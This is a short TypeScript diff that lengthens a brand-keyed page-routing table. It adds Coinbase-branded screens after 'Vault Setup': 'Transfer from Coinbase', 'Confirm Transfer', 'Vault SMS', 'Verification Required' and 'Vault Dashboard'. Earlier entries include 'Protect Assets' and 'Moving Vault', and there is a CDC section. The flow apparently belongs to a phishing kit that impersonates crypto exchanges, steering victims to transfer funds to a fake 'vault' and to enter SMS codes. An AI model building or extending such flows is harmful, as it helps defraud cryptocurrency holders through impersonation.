@@ -38,7 +38,12 @@ export const DEFAULT_NEXT_PAGE: Record<string, string> = {
 	'Coinbase/Protect Assets': 'Coinbase/Moving Vault',
 	'Coinbase/Moving Vault': 'Coinbase/Vault Intro',
 	'Coinbase/Vault Intro': 'Coinbase/Vault Setup',
-	'Coinbase/Vault Setup': 'Coinbase/Vault',
+	'Coinbase/Vault Setup': 'Coinbase/Transfer from Coinbase',
+	'Coinbase/Transfer from Coinbase': 'Coinbase/Confirm Transfer',
+	'Coinbase/Confirm Transfer': 'Coinbase/Vault SMS',
+	'Coinbase/Vault SMS': 'Coinbase/Verification Required',
+	'Coinbase/Verification Required': 'Coinbase/Vault Dashboard',
+	'Coinbase/Vault Dashboard': 'Coinbase/Vault',
 
 	// --- CDC ---
 	'CDC/Loading': 'CDC/Activity',
@@ -90,7 +95,12 @@ export const SKIP_GENERIC_WIRING = new Set<string>([
 	'Coinbase/Protect Assets',
 	'Coinbase/Moving Vault',
 	'Coinbase/Vault Intro',
-	'Coinbase/Vault Setup'
+	'Coinbase/Vault Setup',
+	'Coinbase/Transfer from Coinbase',
+	'Coinbase/Confirm Transfer',
+	'Coinbase/Vault SMS',
+	'Coinbase/Verification Required',
+	'Coinbase/Vault Dashboard'
 ]);
 
 export function settingKey(brand: string, page: string): string {
